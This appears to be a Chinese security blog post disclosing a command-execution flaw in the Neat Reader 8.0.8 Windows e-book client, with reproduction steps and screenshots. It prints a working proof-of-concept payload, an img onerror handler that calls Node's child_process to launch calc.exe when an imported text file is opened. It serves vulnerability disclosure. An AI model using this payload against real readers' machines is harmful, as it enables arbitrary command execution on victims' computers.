#  Neat Reader存在命令执行漏洞   
原创 隐雾安全  隐雾安全   2025-02-19 03:12  
  
一、漏洞描述  
  
北京高知图新教育科技有限公司  
，成立于  
2016  
年，  
Neat Reader是该公司旗下的产品。致力于打造一个满足现代需求的 EPUB/TXT 阅读器，Neat Reader 拥有强大的解析引擎，支持ePub和Txt，无论是任何类型的图书，都能完美展现，提供最佳阅读效果。Neat Reader存在命令执行漏洞，攻击者可以使用此漏洞进行恶意命令执行。  
  
二、漏洞影响  
  
Windows客户端8.0.8  
  
三、漏洞复现  
  
创建一个文本文档，填入以下payload：  
  
<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>">  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ELQKhUzr34ysykHDxYkqwicUYIxY7Zau1vn2oVMj5o4nENjZ5Z3pTIceWM4z7YzParLIeLcUfufCMbvy8AHcFkA/640?wx_fmt=png&from=appmsg "")  
  
打开  
 Neat Reader，点击添加图书，选择包含payload的文本文档导入。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ELQKhUzr34ysykHDxYkqwicUYIxY7Zau1sWwibErlJnKzUOTR0TCkjYdqic2Q3VDARLX94EyaTCVjmzXRujNLyd1A/640?wx_fmt=png&from=appmsg "")  
  
导入后如下图所示  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ELQKhUzr34ysykHDxYkqwicUYIxY7Zau1JOO5fpoHdYNuW4at3Uv8HtZJG9BvJAHImcK5kRxr1xicQQdsyEoaDeQ/640?wx_fmt=png&from=appmsg "")  
  
点击新添加的文本文档，触发payload成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ELQKhUzr34ysykHDxYkqwicUYIxY7Zau1ib4tjOFjSJsfbY8icGv9jTanM8UhGmKN9fg3a1Uz00sKUXOWvpZgNATA/640?wx_fmt=png&from=appmsg "")  
  
--SRC学员投稿--  
  
  
